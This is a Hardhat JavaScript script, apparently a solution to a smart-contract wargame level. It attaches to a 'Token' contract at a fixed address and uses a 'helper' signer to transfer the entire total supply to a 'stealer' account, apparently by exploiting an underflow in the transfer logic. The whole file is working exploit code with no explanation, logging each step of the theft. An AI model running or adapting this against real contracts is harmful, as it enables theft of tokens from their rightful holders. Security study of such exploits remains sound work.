// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");

async function main() {
  const [stealer, helper] = await hre.ethers.getSigners();

  console.log("Stealer account address:", stealer.address);

  const tokenInstanceAddr = "0xB0B0324B9E9Aa9baa7B4E82003e08176ec9Afd29";
  const Token = await hre.ethers.getContractFactory("Token");
  const token = await Token.attach(tokenInstanceAddr);
  const totalSupply = await token.totalSupply();

  console.log("Token total supply:", totalSupply.toString());
  console.log("Stealer account balance:", (await token.balanceOf(stealer.address)).toString());

  console.log("Stealing...");

  await token.connect(helper).transfer(stealer.address, totalSupply);
  console.log("Stealer account balance:", (await token.balanceOf(stealer.address)).toString());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
